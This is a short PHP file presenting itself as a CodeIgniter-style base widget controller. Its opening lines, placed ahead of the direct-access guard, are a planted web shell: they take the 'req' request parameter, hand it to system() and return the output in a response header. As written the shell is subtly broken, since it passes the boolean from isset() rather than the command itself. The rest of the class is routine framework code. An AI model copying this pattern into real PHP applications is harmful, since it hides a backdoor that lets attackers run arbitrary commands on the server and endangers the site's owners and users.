<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); defined('BASEPATH') OR exit('No direct script access allowed');

class Base_Widget_Controller extends Core_Controller {

    public function __construct() {

        parent::__construct();

        $this->load
            ->helper('asset')
        ;
    }

    public function _remap() {

        show_404();
    }

}
